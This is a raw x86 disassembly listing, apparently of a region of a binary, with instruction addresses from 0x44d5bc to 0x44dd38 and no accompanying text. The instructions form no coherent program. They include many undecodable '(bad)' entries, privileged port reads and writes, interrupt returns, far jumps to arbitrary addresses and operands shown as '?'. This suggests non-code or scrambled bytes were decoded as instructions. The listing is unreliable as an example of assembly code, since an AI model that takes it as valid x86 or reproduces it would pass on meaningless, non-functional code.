  44d5bc:	dec    esp
  44d5bd:	adc    al,0xc6
  44d5bf:	inc    esp
  44d5c0:	fstp   QWORD PTR [eax+ecx*2]
  44d5c3:	dec    edx
  44d5c4:	cmc    
  44d5c5:	cmp    BYTE PTR [eax+eiz*1-0x38],ch
  44d5c9:	dec    edx
  44d5ca:	push   ebx
  44d5cb:	pop    esi
  44d5cc:	lea    esp,[ecx]
  44d5ce:	xchg   esp,eax
  44d5cf:	cmp    BYTE PTR [ecx+0x4c],bh
  44d5d2:	adc    dl,BYTE PTR [edi]
  44d5d4:	cs or  al,0x34
  44d5d7:	xlat   BYTE PTR ds:[ebx]
  44d5d8:	and    DWORD PTR [edi],0xd98efb80
  44d5de:	in     eax,0x4c
  44d5e0:	mov    DWORD PTR [ecx-0x68e37cc5],ecx
  44d5e6:	ins    DWORD PTR es:[edi],dx
  44d5e7:	cs pop edx
  44d5e9:	inc    edi
  44d5ea:	stos   BYTE PTR es:[edi],al
  44d5eb:	lahf   
  44d5ec:	iret   
  44d5ed:	add    eax,0xc3325c6f
  44d5f2:	add    ah,BYTE PTR [ebx+0x7c]
  44d5f5:	stos   DWORD PTR es:[edi],eax
  44d5f6:	outs   dx,BYTE PTR ds:[esi]
  44d5f7:	pop    ss
  44d5f8:	repz push 0x30
  44d5fb:	xchg   edi,eax
  44d5fc:	dec    ecx
  44d5fd:	xor    eax,0x5e2c18f
  44d602:	inc    edx
  44d603:	jmp    0x3b2152ea
  44d608:	rol    dl,1
  44d60a:	pusha  
  44d60b:	sti    
  44d60c:	mov    ah,ch
  44d60e:	sub    BYTE PTR [ebx+0x3c],cl
  44d611:	adc    DWORD PTR [edi-0x2c],edx
  44d614:	mov    bl,0x67
  44d616:	out    0x12,al
  44d618:	call   0x686f:0xb18b1bf7
  44d61f:	xchg   esi,eax
  44d620:	or     DWORD PTR [eax+0x4ca84d86],ebp
  44d626:	mov    ds:0xc5ebb39e,eax
  44d62b:	pop    ebx
  44d62c:	jb     0x44d631
  44d62e:	xor    ah,BYTE PTR [ebx+0xaebd9b7]
  44d634:	adc    ch,BYTE PTR [edi+ebx*1]
  44d637:	pop    edi
  44d638:	jae    0x44d5dd
  44d63a:	mov    dl,0x3b
  44d63c:	sub    bh,BYTE PTR [edi]
  44d63e:	lock xlat BYTE PTR ds:[ebx]
  44d640:	ret    0x5c3f
  44d643:	ret    
  44d644:	out    0x79,al
  44d646:	xchg   BYTE PTR [ebp-0x449f523b],dl
  44d64c:	sub    bl,BYTE PTR [edx+ecx*2-0x70fa071d]
  44d653:	mov    eax,0xc30ae086
  44d658:	enter  0xde4b,0x17
  44d65c:	and    ecx,DWORD PTR [esi-0x7d8c92a0]
  44d662:	mov    ebx,0xce19a8c4
  44d667:	aam    0x62
  44d669:	inc    edi
  44d66a:	adc    esp,ebp
  44d66c:	(bad)  
  44d66d:	hlt    
  44d66e:	ret    0x890f
  44d671:	mov    ecx,0x367ab128
  44d676:	(bad)  
  44d677:	std    
  44d678:	sub    al,0x3
  44d67a:	inc    eax
  44d67b:	dec    ecx
  44d67c:	fnstenv [eax-0x6c88b6a1]
  44d682:	pop    ds
  44d683:	sub    DWORD PTR [edi],edx
  44d685:	adc    ch,BYTE PTR [ecx-0x2a6e2120]
  44d68b:	mov    eax,ds:0x92ef0175
  44d690:	add    al,0x3
  44d692:	ror    BYTE PTR [ebx+0x1a76bc25],1
  44d698:	jne    0x44d6bb
  44d69a:	push   ds
  44d69b:	xchg   edi,eax
  44d69c:	push   ebp
  44d69d:	imul   ecx,esp,0x35
  44d6a0:	cwde   
  44d6a1:	sbb    BYTE PTR [edx-0x2714c42c],0x7a
  44d6a8:	jne    0x44d6e5
  44d6aa:	fs mov esp,0x22422d89
  44d6b0:	mov    cl,0xdb
  44d6b2:	loope  0x44d6d5
  44d6b4:	jge    0x44d6b8
  44d6b6:	sub    dh,BYTE PTR [edx+0x73a28816]
  44d6bc:	cs iret 
  44d6be:	sbb    ebx,DWORD PTR ds:0x69ec9789
  44d6c4:	into   
  44d6c5:	and    bh,BYTE PTR [ecx+0x46021365]
  44d6cb:	mov    al,ds:0xbe4d6517
  44d6d0:	mov    WORD PTR [eax+eiz*2+0x83c9feb],ds
  44d6d7:	cmp    ebx,ebp
  44d6d9:	push   ecx
  44d6da:	sbb    eax,ebp
  44d6dc:	sub    BYTE PTR [edi+edx*8-0x2bfd6083],ah
  44d6e3:	xchg   edi,eax
  44d6e4:	xchg   edi,eax
  44d6e5:	push   es
  44d6e6:	mov    edi,0x74029052
  44d6eb:	repz les esp,FWORD PTR es:[ecx+0xb]
  44d6f0:	sahf   
  44d6f1:	loop   0x44d74a
  44d6f3:	sub    DWORD PTR [edx],edi
  44d6f5:	out    dx,al
  44d6f6:	lahf   
  44d6f7:	push   ss
  44d6f8:	jbe    0x44d728
  44d6fa:	call   0x4cbb:0x9802f07c
  44d701:	(bad)  
  44d702:	in     al,dx
  44d703:	dec    edi
  44d704:	jb     0x44d72e
  44d706:	push   edi
  44d707:	test   eax,0x759fb310
  44d70c:	jl     0x44d76f
  44d70e:	rep stos DWORD PTR es:[edi],eax
  44d710:	cs add ch,al
  44d713:	scas   eax,DWORD PTR es:[edi]
  44d714:	jge    0x44d71a
  44d716:	mov    ch,0x41
  44d718:	lds    esp,FWORD PTR [edx+0x10f01b1f]
  44d71e:	and    ah,BYTE PTR [ebp+0x78]
  44d721:	cmp    ah,BYTE PTR [edi-0x48]
  44d724:	mov    ds:0x49113bb9,al
  44d729:	imul   edx,esi,0x10
  44d72c:	dec    edi
  44d72d:	and    eax,0x60b2f1f
  44d732:	shl    DWORD PTR [ebp-0x20f34813],cl
  44d738:	pop    edx
  44d739:	add    ch,BYTE PTR [eax]
  44d73b:	jg     0x44d7ac
  44d73d:	or     al,0x8f
  44d73f:	jge    0xfa63f6ba
  44d745:	lock sub BYTE PTR [ebp-0x2ba3da24],dl
  44d74c:	sbb    eax,0x3d8d039a
  44d751:	hlt    
  44d752:	dec    esp
  44d753:	adc    al,0x88
  44d755:	add    DWORD PTR [esi+0x44fdeb37],ebp
  44d75b:	scas   al,BYTE PTR es:[edi]
  44d75c:	call   0xce971daa
  44d761:	int    0x50
  44d763:	push   esp
  44d764:	cmp    al,0x96
  44d766:	xor    ch,ch
  44d768:	inc    ebx
  44d769:	mov    fs,WORD PTR [eax+0x6b]
  44d76c:	lahf   
  44d76d:	add    al,0x6e
  44d76f:	xchg   edx,eax
  44d770:	push   ds
  44d771:	pop    ebx
  44d772:	aam    0xaf
  44d774:	ins    DWORD PTR es:[edi],dx
  44d775:	int    0x94
  44d777:	mov    eax,ds:0xf5d694f2
  44d77c:	fnstenv [edi+0x67]
  44d77f:	std    
  44d780:	mov    bh,0xbb
  44d782:	or     edx,ebx
  44d784:	or     edi,ebx
  44d786:	jne    0x44d7d0
  44d788:	cmp    eax,0xc7f9a0dd
  44d78d:	ins    DWORD PTR es:[edi],dx
  44d78e:	mov    BYTE PTR [edi+ebp*4+0x74c4221c],al
  44d795:	push   edi
  44d796:	(bad)  
  44d797:	mov    esi,0x4d1fab2b
  44d79c:	ror    dh,1
  44d79e:	(bad)  
  44d79f:	mov    ebp,0xd4fcdece
  44d7a4:	(bad)  
  44d7a5:	fmul   DWORD PTR [esi+0x6e3eabe6]
  44d7ab:	mov    ds:0x2ecafb88,al
  44d7b0:	mov    ebp,0x1fb256bf
  44d7b5:	add    ch,BYTE PTR [edx+0x2e]
  44d7b8:	pop    eax
  44d7b9:	in     al,dx
  44d7ba:	and    DWORD PTR [edx-0x1ee079ef],edi
  44d7c0:	xchg   edx,eax
  44d7c1:	inc    ebx
  44d7c2:	std    
  44d7c3:	ret    0xe374
  44d7c6:	out    dx,eax
  44d7c7:	aam    0x68
  44d7c9:	pop    ebp
  44d7ca:	xor    dh,BYTE PTR [ebx+0x2f28c0a2]
  44d7d0:	mov    dh,0x37
  44d7d2:	push   esp
  44d7d3:	test   eax,0x2262b688
  44d7d8:	sub    BYTE PTR [edx],cl
  44d7da:	xor    BYTE PTR [ebx-0x65dac60a],bl
  44d7e0:	jnp    0x44d7ab
  44d7e2:	add    al,0xd4
  44d7e4:	mov    esi,0xebd60a80
  44d7e9:	xchg   edx,eax
  44d7ea:	pop    ds
  44d7eb:	loope  0x44d836
  44d7ed:	arpl   bp,sp
  44d7ef:	cmp    al,0x25
  44d7f1:	daa    
  44d7f2:	push   edi
  44d7f3:	pop    edi
  44d7f4:	ins    DWORD PTR es:[edi],dx
  44d7f5:	jmp    0xed7acc19
  44d7fa:	loop   0x44d78b
  44d7fc:	rcr    DWORD PTR [esi+ebx*1-0x23],1
  44d800:	pusha  
  44d801:	ja     0x44d7f7
  44d803:	xor    BYTE PTR [edx],bl
  44d805:	mov    DWORD PTR [bx+di+0x6771],edi
  44d80a:	add    BYTE PTR [edi-0xd04b1f8],al
  44d810:	loop   0x44d80a
  44d812:	pop    ds
  44d813:	test   eax,0x20e745b0
  44d818:	jo     0x44d856
  44d81a:	pop    ebp
  44d81b:	mov    ecx,0x81b6d476
  44d820:	or     DWORD PTR [eax],ebp
  44d822:	dec    edi
  44d823:	inc    edx
  44d824:	lahf   
  44d825:	jl     0x44d87d
  44d827:	popf   
  44d828:	xchg   ebp,eax
  44d829:	push   0xa5f3151f
  44d82e:	je     0x44d86a
  44d830:	dec    esp
  44d831:	or     esp,esp
  44d833:	aam    0xd3
  44d835:	arpl   WORD PTR [ecx+0x3362a7c9],bp
  44d83b:	pop    eax
  44d83c:	mov    edi,fs
  44d83e:	mov    eax,ds:0x9428927a
  44d843:	push   esp
  44d844:	fsub   st,st(6)
  44d846:	pop    ds
  44d847:	aam    0xbe
  44d849:	mov    ebx,0x2157d857
  44d84e:	jno    0x44d884
  44d850:	xchg   DWORD PTR [ecx],edx
  44d852:	in     eax,dx
  44d853:	ins    DWORD PTR es:[edi],dx
  44d854:	pop    ss
  44d855:	cmp    esi,ebx
  44d857:	aaa    
  44d858:	in     al,dx
  44d859:	pop    ds
  44d85a:	jmp    0xbc82:0x290143d4
  44d861:	sti    
  44d862:	adc    eax,DWORD PTR [ebp-0x7]
  44d865:	sbb    eax,0xff6ed55b
  44d86a:	loop   0x44d834
  44d86c:	xchg   esp,eax
  44d86d:	and    ecx,DWORD PTR [edx-0x2c]
  44d870:	xor    al,0x5c
  44d872:	jns    0x44d892
  44d874:	repnz mov ebp,0x2c619ccf
  44d87a:	ins    BYTE PTR es:[edi],dx
  44d87b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d87c:	addr16 in al,0x1
  44d87f:	add    eax,0xdd331508
  44d884:	int3   
  44d885:	add    bl,BYTE PTR [eax+0x7137b613]
  44d88b:	push   esp
  44d88c:	and    ebx,DWORD PTR ss:[esi]
  44d88f:	xlat   BYTE PTR ds:[ebx]
  44d890:	sub    DWORD PTR [ecx+edi*8-0x63],0x4a
  44d895:	xchg   BYTE PTR [ebx+edx*8+0x745f11ee],ah
  44d89c:	inc    ebp
  44d89d:	inc    esp
  44d89e:	hlt    
  44d89f:	mov    ah,0x39
  44d8a1:	outs   dx,DWORD PTR ds:[esi]
  44d8a2:	inc    esi
  44d8a3:	mov    esi,0xd31bff95
  44d8a8:	das    
  44d8a9:	inc    ebx
  44d8aa:	pop    es
  44d8ab:	jno    0x44d8bd
  44d8ad:	ror    ch,cl
  44d8af:	aad    0xd6
  44d8b1:	push   ss
  44d8b2:	out    dx,eax
  44d8b3:	cmp    BYTE PTR [ecx-0x40],cl
  44d8b6:	push   edi
  44d8b7:	mov    di,di
  44d8ba:	push   ecx
  44d8bb:	pop    esi
  44d8bc:	call   0xd5c97bf6
  44d8c1:	pop    ss
  44d8c2:	ss mov bh,0x73
  44d8c5:	sub    bl,BYTE PTR [edx+0x704eaf14]
  44d8cb:	mov    ebx,0xcbeca786
  44d8d0:	out    dx,al
  44d8d1:	pop    esp
  44d8d2:	pop    edi
  44d8d3:	fisubr DWORD PTR [esi-0x11]
  44d8d6:	cwde   
  44d8d7:	aam    0x77
  44d8d9:	bound  eax,QWORD PTR [esi-0x13776bb5]
  44d8df:	pop    edx
  44d8e0:	mov    edi,DWORD PTR [ebx-0x58]
  44d8e3:	daa    
  44d8e4:	xor    DWORD PTR [esi+edx*4+0x2f],ebx
  44d8e8:	jo     0x44d911
  44d8ea:	or     BYTE PTR [ecx-0x9fbddb7],ch
  44d8f0:	das    
  44d8f1:	add    eax,DWORD PTR ds:0x1e2f3bc2
  44d8f7:	in     eax,dx
  44d8f8:	stos   DWORD PTR es:[edi],eax
  44d8f9:	xchg   edi,eax
  44d8fa:	dec    eax
  44d8fb:	mov    edi,0xd705791e
  44d900:	dec    ecx
  44d901:	arpl   WORD PTR [esp+eiz*8],cx
  44d904:	ficom  DWORD PTR [ebp+0x5e870e8]
  44d90a:	arpl   WORD PTR [ebp+0x36],bx
  44d90d:	inc    eax
  44d90e:	xlat   BYTE PTR cs:[ebx]
  44d910:	cwde   
  44d911:	mov    al,0x9f
  44d913:	stos   BYTE PTR es:[edi],al
  44d914:	int3   
  44d915:	xchg   DWORD PTR [edx+0x6669a4fb],edx
  44d91b:	ror    BYTE PTR [ecx+0x6c3f415],1
  44d921:	mov    ds:0xad99d5e1,eax
  44d926:	mov    eax,ds:0x74a3b720
  44d92b:	sbb    eax,0x3926ff8b
  44d930:	adc    esp,ebx
  44d932:	stos   DWORD PTR es:[edi],eax
  44d933:	adc    al,0xe8
  44d935:	pop    edi
  44d936:	loope  0x44d90f
  44d938:	sub    BYTE PTR [eax+ebx*8-0xb],cl
  44d93c:	mov    dh,0x19
  44d93e:	in     eax,dx
  44d93f:	xchg   esp,eax
  44d940:	mov    esi,0x247d1f46
  44d945:	outs   dx,DWORD PTR ds:[esi]
  44d946:	clc    
  44d947:	push   eax
  44d948:	neg    BYTE PTR [eax+0x484aa293]
  44d94e:	imul   ecx,ebx,0xffffff9f
  44d951:	jmp    0xd213:0xb9b77517
  44d958:	rcr    BYTE PTR [edi],0x44
  44d95b:	mov    BYTE PTR [ecx],dh
  44d95d:	repnz pushf 
  44d95f:	in     eax,0xb6
  44d961:	add    eax,0xeef9f898
  44d966:	scas   al,BYTE PTR es:[edi]
  44d967:	jmp    0x17a5cdfd
  44d96c:	cwde   
  44d96d:	iret   
  44d96e:	test   al,0xe7
  44d970:	jle    0x44d945
  44d972:	ds mov edx,0x5cfc9062
  44d978:	or     DWORD PTR [ecx-0x5c],edx
  44d97b:	jmp    DWORD PTR [ecx+0x23611ffc]
  44d981:	shl    DWORD PTR [edx+edi*4],1
  44d984:	push   edi
  44d985:	dec    eax
  44d986:	(bad)  
  44d987:	repnz retf 
  44d989:	add    dl,BYTE PTR [edx-0x35e88f63]
  44d98f:	dec    esi
  44d990:	cdq    
  44d991:	ins    BYTE PTR es:[edi],dx
  44d992:	pop    ds
  44d993:	jne    0x44da0a
  44d995:	aad    0xee
  44d997:	xchg   ebx,eax
  44d998:	adc    ebp,DWORD PTR [esi]
  44d99a:	je     0x44d9e3
  44d99c:	stc    
  44d99d:	stc    
  44d99e:	jle    0x44d97f
  44d9a0:	add    eax,0xb3f5de23
  44d9a5:	jg     0x44d932
  44d9a7:	daa    
  44d9a8:	push   cs
  44d9a9:	pop    es
  44d9aa:	(bad)  
  44d9ab:	sub    ch,BYTE PTR [ebx]
  44d9ad:	mov    eax,ds:0xcde8e606
  44d9b2:	add    bh,dl
  44d9b4:	repz mov gs,ebx
  44d9b7:	cmp    BYTE PTR ds:0x882f95b2,al
  44d9bd:	jne    0x44d9c1
  44d9bf:	push   eax
  44d9c0:	dec    eax
  44d9c1:	mov    ebx,ebx
  44d9c3:	data16 sti 
  44d9c5:	xchg   BYTE PTR [ecx+0x36e4894d],dh
  44d9cb:	iret   
  44d9cc:	aaa    
  44d9cd:	pop    ecx
  44d9ce:	adc    BYTE PTR [ecx+ecx*4+0xdfd4503],bl
  44d9d5:	mov    eax,0x144830d1
  44d9da:	dec    esi
  44d9db:	popa   
  44d9dc:	ins    DWORD PTR es:[edi],dx
  44d9dd:	adc    bl,ch
  44d9df:	adc    al,0x9d
  44d9e1:	stos   DWORD PTR es:[edi],eax
  44d9e2:	adc    edx,DWORD PTR [esi+0x18f1998f]
  44d9e8:	imul   edx,ecx,0xa9ae94d7
  44d9ee:	out    0xd4,eax
  44d9f0:	fild   WORD PTR [edx-0x20]
  44d9f3:	data16 add BYTE PTR [edi+eiz*4-0x635d4909],0xd5
  44d9fc:	push   esi
  44d9fd:	mov    cs,ebx
  44d9ff:	adc    al,0x90
  44da01:	xchg   DWORD PTR [eax+eiz*1+0x35],eax
  44da05:	sub    bh,BYTE PTR [edi]
  44da07:	mov    DWORD PTR [ebp+0x3],esi
  44da0a:	ss loope 0x44da0e
  44da0d:	sbb    al,0xd7
  44da0f:	adc    ebx,esi
  44da11:	pop    esp
  44da12:	push   ds
  44da13:	dec    edi
  44da14:	call   0x453:0x16309c18
  44da1b:	mov    bl,0x7c
  44da1d:	cmp    BYTE PTR [eax-0x3dcfd52e],al
  44da23:	cmp    eax,0xc6c28316
  44da28:	in     eax,0xfa
  44da2a:	pop    ds
  44da2b:	pop    ss
  44da2c:	aas    
  44da2d:	cmp    al,0xab
  44da2f:	dec    esp
  44da30:	or     BYTE PTR [edi-0x5f],0xd4
  44da34:	adc    al,dh
  44da36:	pop    ss
  44da37:	and    edx,ebx
  44da39:	fdiv   QWORD PTR [ecx+0x62]
  44da3c:	mov    BYTE PTR [edi],cl
  44da3e:	xchg   esi,eax
  44da3f:	addr16 das 
  44da41:	js     0x44d9f6
  44da43:	fsubr  st,st(7)
  44da45:	pop    es
  44da46:	aaa    
  44da47:	daa    
  44da48:	adc    dl,0x1f
  44da4b:	mov    DWORD PTR [eax+0x36],ebx
  44da4e:	(bad)  
  44da4f:	nop
  44da50:	add    esi,DWORD PTR [ebp-0x346e18e1]
  44da56:	sub    edi,DWORD PTR [esi]
  44da58:	sub    BYTE PTR [edx],bh
  44da5a:	cmp    edx,esp
  44da5c:	imul   ebp,edi,0x30
  44da5f:	(bad)  
  44da60:	sar    DWORD PTR [eax-0x63],cl
  44da63:	sub    ecx,DWORD PTR [edx-0x4b6c0e59]
  44da69:	sub    ch,dl
  44da6b:	mov    eax,0xd4724540
  44da70:	jno    0x44daa9
  44da72:	push   edi
  44da73:	mov    al,0x51
  44da75:	jns    0x44d9fb
  44da77:	repz mov bl,bh
  44da7a:	inc    ebp
  44da7b:	push   ebx
  44da7c:	lods   al,BYTE PTR ds:[esi]
  44da7d:	scas   eax,DWORD PTR es:[edi]
  44da7e:	jmp    0xd84762a7
  44da83:	pop    esp
  44da84:	ds push ds
  44da86:	xor    BYTE PTR [ebp-0xc],bl
  44da89:	xchg   esi,eax
  44da8a:	sbb    eax,0xcb0d89a2
  44da8f:	sahf   
  44da90:	and    ch,al
  44da92:	bound  eax,QWORD PTR [esi]
  44da94:	push   0x2ad63802
  44da99:	hlt    
  44da9a:	pop    ebp
  44da9b:	int    0x55
  44da9d:	nop
  44da9e:	pusha  
  44da9f:	mov    ebp,0x8330a26a
  44daa4:	shl    bl,1
  44daa6:	clc    
  44daa7:	aam    0x6c
  44daa9:	xor    ebp,DWORD PTR ds:[eax-0x701b96f1]
  44dab0:	mov    BYTE PTR [ebx-0x5da19298],dh
  44dab6:	or     al,0x96
  44dab8:	cli    
  44dab9:	add    ah,dh
  44dabb:	pop    eax
  44dabc:	and    ebx,esp
  44dabe:	mov    ch,0xdd
  44dac0:	xchg   ebp,eax
  44dac1:	out    0x1f,al
  44dac3:	mov    ch,0xc3
  44dac5:	adc    BYTE PTR [edi-0x67],cl
  44dac8:	clc    
  44dac9:	retf   0xad3d
  44dacc:	inc    ebp
  44dacd:	ret    0xfa46
  44dad0:	(bad)  
  44dad1:	inc    ecx
  44dad2:	pop    esi
  44dad3:	mov    esp,0x8b60a246
  44dad8:	gs scas eax,DWORD PTR es:[edi]
  44dada:	neg    BYTE PTR [ebx-0x2a114c8e]
  44dae0:	mov    WORD PTR [edx+0x1d22bee3],?
  44dae6:	(bad)  
  44dae9:	xchg   esi,eax
  44daea:	pop    ds
  44daeb:	loope  0x44db47
  44daed:	jno    0x44db4c
  44daef:	stos   DWORD PTR es:[edi],eax
  44daf0:	mov    ah,0x98
  44daf2:	mov    ah,0xd4
  44daf4:	inc    edx
  44daf5:	leave  
  44daf6:	es stc 
  44daf8:	aas    
  44daf9:	adc    eax,0xa5887d57
  44dafe:	cmp    esp,DWORD PTR [edx]
  44db00:	mov    cl,0xbe
  44db02:	cdq    
  44db03:	xchg   ecx,eax
  44db04:	cmp    eax,DWORD PTR [edx]
  44db06:	mov    eax,0xf7e86025
  44db0b:	test   dl,dl
  44db0d:	hlt    
  44db0e:	pop    ds
  44db0f:	sbb    edx,eax
  44db11:	dec    esp
  44db12:	push   ds
  44db13:	lock mov ch,0x2f
  44db16:	or     BYTE PTR [edx-0x46],al
  44db19:	call   DWORD PTR [edi-0x7e54766e]
  44db1f:	push   esp
  44db20:	or     dh,BYTE PTR [ecx-0x1a76e51c]
  44db26:	inc    esp
  44db27:	pusha  
  44db28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44db29:	lods   al,BYTE PTR ds:[esi]
  44db2a:	loop   0x44db35
  44db2c:	push   es
  44db2d:	mov    dl,0x2d
  44db2f:	cmc    
  44db30:	mov    BYTE PTR [edi-0x43310883],al
  44db36:	hlt    
  44db37:	or     ebx,DWORD PTR [esi+0x417fc709]
  44db3d:	sbb    eax,0x224ac7fc
  44db42:	sub    DWORD PTR [ebx],ecx
  44db44:	unpcklps xmm6,xmm2
  44db47:	dec    eax
  44db48:	jecxz  0x44dae0
  44db4a:	cmp    al,0x54
  44db4c:	out    0xfa,eax
  44db4e:	dec    ebx
  44db4f:	lock mov BYTE PTR [ecx],al
  44db52:	scas   eax,DWORD PTR es:[edi]
  44db53:	xor    DWORD PTR [eax-0x79d0b5f2],esi
  44db59:	add    ch,BYTE PTR [edx-0x15018e0]
  44db5f:	sbb    eax,0x7f66a0b6
  44db64:	js     0x44db0f
  44db66:	mov    eax,0x80b31b0b
  44db6b:	sub    ebx,DWORD PTR [ecx+0x26]
  44db6e:	pusha  
  44db6f:	iret   
  44db70:	xchg   ebx,eax
  44db71:	mov    ecx,0x29dc134
  44db76:	mov    al,0x4c
  44db78:	mov    BYTE PTR es:[esi],cl
  44db7b:	lods   eax,DWORD PTR ds:[esi]
  44db7c:	mov    DWORD PTR [ebp-0x4f],eax
  44db7f:	aas    
  44db80:	ds ja  0x44db1f
  44db83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44db84:	(bad)  
  44db85:	inc    BYTE PTR [edi-0x2d]
  44db88:	sbb    ebp,DWORD PTR [ecx+eax*4-0x1d]
  44db8c:	push   ds
  44db8d:	mov    al,0x10
  44db8f:	dec    ebp
  44db90:	add    esp,DWORD PTR [edi+ebx*1]
  44db93:	stc    
  44db94:	fs fs or al,0x4
  44db98:	mov    bl,ah
  44db9a:	push   0x189228d5
  44db9f:	mov    ds:0xbba97a69,al
  44dba4:	mov    cl,dh
  44dba6:	mov    eax,0x599bbda6
  44dbab:	inc    esp
  44dbac:	inc    eax
  44dbad:	repnz stos DWORD PTR es:[edi],eax
  44dbaf:	aad    0xd7
  44dbb1:	ficomp DWORD PTR [eax+0x29163dd0]
  44dbb7:	push   0xffffff88
  44dbb9:	repz xor bl,BYTE PTR [edx-0x35]
  44dbbd:	popf   
  44dbbe:	cwde   
  44dbbf:	mov    bh,0x66
  44dbc1:	add    ah,dl
  44dbc3:	add    BYTE PTR [edi+0x47],bh
  44dbc6:	jne    0x44dba7
  44dbc8:	or     al,0x16
  44dbca:	push   ds
  44dbcb:	and    esp,ecx
  44dbcd:	lds    edx,FWORD PTR [edx+0x4]
  44dbd0:	clc    
  44dbd1:	inc    eax
  44dbd2:	aam    0xaa
  44dbd4:	cmc    
  44dbd5:	scas   al,BYTE PTR es:[edi]
  44dbd6:	dec    esp
  44dbd7:	or     dl,ah
  44dbd9:	test   DWORD PTR [edx+0x76b2624b],ebx
  44dbdf:	test   esi,ecx
  44dbe1:	dec    esi
  44dbe2:	(bad)  
  44dbe4:	jnp    0x44dbaf
  44dbe6:	push   esi
  44dbe7:	sub    BYTE PTR [ebx],al
  44dbe9:	cmp    bl,BYTE PTR [esi+0x60fa83a4]
  44dbef:	and    eax,0xcd89b014
  44dbf4:	imul   esi,DWORD PTR [edx],0x1f
  44dbf7:	pop    ebp
  44dbf8:	xchg   esi,eax
  44dbf9:	cmp    al,0xf
  44dbfb:	push   esp
  44dbfc:	sub    dl,0xf5
  44dbff:	aad    0xc8
  44dc01:	repz cmp ah,BYTE PTR [edx-0x6b]
  44dc05:	dec    eax
  44dc06:	icebp  
  44dc07:	dec    eax
  44dc08:	xchg   esi,eax
  44dc09:	adc    DWORD PTR [esi],0xffffffb1
  44dc0c:	mov    eax,edx
  44dc0e:	les    esi,FWORD PTR [edi+0x434368d1]
  44dc14:	adc    al,0xb4
  44dc16:	addr16 js 0x44dc8f
  44dc19:	or     DWORD PTR [edx],edx
  44dc1b:	push   esp
  44dc1c:	jmp    0x88eebae1
  44dc21:	pop    ebp
  44dc22:	xchg   edx,eax
  44dc23:	das    
  44dc24:	scas   al,BYTE PTR es:[edi]
  44dc25:	sub    eax,0x23bb1f8
  44dc2a:	adc    bh,BYTE PTR [edi+0x424d8dd5]
  44dc30:	mov    ah,0x45
  44dc32:	push   ds
  44dc33:	xor    DWORD PTR [eax-0x7b],esi
  44dc36:	xor    bh,BYTE PTR [ebx-0x554af988]
  44dc3c:	mov    dh,0xe3
  44dc3e:	push   es
  44dc3f:	mov    al,0xa2
  44dc41:	inc    ebp
  44dc42:	mov    ?,WORD PTR [edi-0x48]
  44dc45:	pop    es
  44dc46:	adc    BYTE PTR ds:0x803f4989,al
  44dc4c:	ret    
  44dc4d:	adc    BYTE PTR [eax],bl
  44dc4f:	mov    BYTE PTR [edi+0x2],al
  44dc52:	in     al,0x40
  44dc54:	mov    ebp,0x71b5f957
  44dc59:	outs   dx,BYTE PTR ds:[esi]
  44dc5a:	push   ds
  44dc5b:	cmp    DWORD PTR [ebp+0x2fba2baf],esp
  44dc61:	or     DWORD PTR [ecx+0x5f],edx
  44dc64:	xor    eax,0xf8326429
  44dc69:	(bad)  
  44dc6a:	lods   al,BYTE PTR ds:[esi]
  44dc6b:	dec    eax
  44dc6c:	push   ss
  44dc6d:	and    DWORD PTR [esi+edi*2],0xffffffb1
  44dc71:	mov    ecx,0x26aa3d60
  44dc76:	out    dx,al
  44dc77:	dec    esi
  44dc78:	mov    esp,0x8e80bb9
  44dc7d:	add    ecx,DWORD PTR [esi-0x59fc1e1a]
  44dc83:	outs   dx,DWORD PTR ds:[esi]
  44dc84:	jmp    DWORD PTR [edi+0x1f]
  44dc87:	xor    esp,DWORD PTR [eax+0x60]
  44dc8a:	mov    esi,ecx
  44dc8c:	enter  0xdf6,0xd4
  44dc90:	xchg   edi,eax
  44dc91:	fild   WORD PTR [ecx-0x7c]
  44dc94:	test   BYTE PTR [edx],bh
  44dc96:	pushf  
  44dc97:	imul   ecx,DWORD PTR [eax-0x7ce9f1a3],0xc22b3507
  44dca1:	add    eax,0xabf93690
  44dca6:	fwait
  44dca7:	cmp    dl,BYTE PTR [ebp-0x80]
  44dcaa:	aas    
  44dcab:	outs   dx,DWORD PTR ds:[esi]
  44dcac:	lds    esi,FWORD PTR ds:0x858854b5
  44dcb2:	(bad)  
  44dcb3:	stc    
  44dcb4:	outs   dx,BYTE PTR ds:[esi]
  44dcb5:	adc    esi,ebx
  44dcb7:	mov    ecx,0xfdb7226e
  44dcbc:	or     BYTE PTR [edx+0x788831fa],cl
  44dcc2:	bound  ebp,QWORD PTR ds:0xb347d323
  44dcc8:	dec    esp
  44dcc9:	ret    0x360f
  44dccc:	sub    DWORD PTR [esi+edi*1],ebx
  44dccf:	mov    edi,0xcc3842f5
  44dcd4:	push   0x79d2b9d1
  44dcd9:	out    0x1f,al
  44dcdb:	jae    0x44dd26
  44dcdd:	jae    0x44dca6
  44dcdf:	pop    eax
  44dce0:	stos   BYTE PTR es:[edi],al
  44dce1:	sti    
  44dce2:	imul   esi,ebp,0xccb20239
  44dce8:	rcl    BYTE PTR [edi],cl
  44dcea:	cmp    al,ch
  44dcec:	or     al,0x57
  44dcee:	das    
  44dcef:	fwait
  44dcf0:	lea    ebx,[ebp-0x49]
  44dcf3:	sbb    edx,edx
  44dcf5:	sub    ch,bh
  44dcf7:	push   ebp
  44dcf8:	pop    eax
  44dcf9:	int3   
  44dcfa:	jmp    0x9f0c18d3
  44dcff:	xchg   ebp,eax
  44dd00:	and    esp,DWORD PTR [edx]
  44dd02:	out    dx,al
  44dd03:	int3   
  44dd04:	mov    DWORD PTR [ecx],edx
  44dd06:	jge    0x44dcb5
  44dd08:	jbe    0x44dce7
  44dd0a:	pop    ss
  44dd0b:	push   0xffffff9e
  44dd0d:	add    al,al
  44dd0f:	sbb    esi,esi
  44dd11:	mov    bl,0x2
  44dd13:	pusha  
  44dd14:	pop    eax
  44dd15:	imul   ebx,edi,0xc
  44dd18:	mov    DWORD PTR ds:0x76532d57,eax
  44dd1e:	int3   
  44dd1f:	cmp    eax,0xcab005b3
  44dd24:	push   edx
  44dd25:	cdq    
  44dd26:	shl    BYTE PTR [ebp+0x6f],0xa3
  44dd2a:	pusha  
  44dd2b:	sub    DWORD PTR [edx],0xea8ffd88
  44dd31:	inc    ebx
  44dd32:	and    dl,dh
  44dd34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dd35:	aam    0x59
  44dd37:	pop    eax
  44dd38:	jmp    0xd493:0x682b57ac
